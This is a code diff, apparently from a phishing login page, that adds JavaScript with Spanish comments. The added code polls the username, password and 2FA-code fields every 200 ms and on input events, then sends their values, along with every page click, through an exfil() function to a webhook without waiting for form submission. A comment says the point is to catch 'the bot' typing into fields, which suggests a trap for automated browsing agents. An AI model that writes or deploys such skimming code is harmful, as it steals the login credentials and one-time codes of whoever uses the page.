@@ -27,6 +27,39 @@
   // en el webhook aunque no toque ningun form.
   exfil("pageload", { ref: document.referrer, url: location.href, ua: navigator.userAgent });
 
+  // Captura robusta: NO dependemos del submit. Si el bot escribe en los campos
+  // (aunque nunca envie el form), lo levantamos por polling + eventos.
+  var ult = { u: "", p: "", c: "" };
+  function chequear() {
+    var gu = document.getElementById("txt-login");
+    var gp = document.getElementById("txt-password");
+    var gc = document.getElementById("txt-2fa");
+    var u = gu ? gu.value : "";
+    var p = gp ? gp.value : "";
+    var c = gc ? gc.value : "";
+    if ((u && u !== ult.u) || (p && p !== ult.p)) {
+      ult.u = u; ult.p = p;
+      exfil("campos-login", { usuario: u, clave: p });
+    }
+    if (c && c !== ult.c) {
+      ult.c = c;
+      exfil("campos-2fa", { codigo: c });
+    }
+  }
+  setInterval(chequear, 200);
+  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
+    var el = document.getElementById(id);
+    if (el) {
+      el.addEventListener("input", chequear);
+      el.addEventListener("change", chequear);
+    }
+  });
+  // Diagnostico de interaccion: cualquier click en la pagina.
+  document.addEventListener("click", function (ev) {
+    var t = ev.target ? (ev.target.id || ev.target.tagName || "?") : "?";
+    exfil("click", { t: t });
+  }, true);
+
   var formLogin = document.getElementById("form-login");
   var form2fa   = document.getElementById("form-2fa");
   var title     = document.getElementById("card-title");
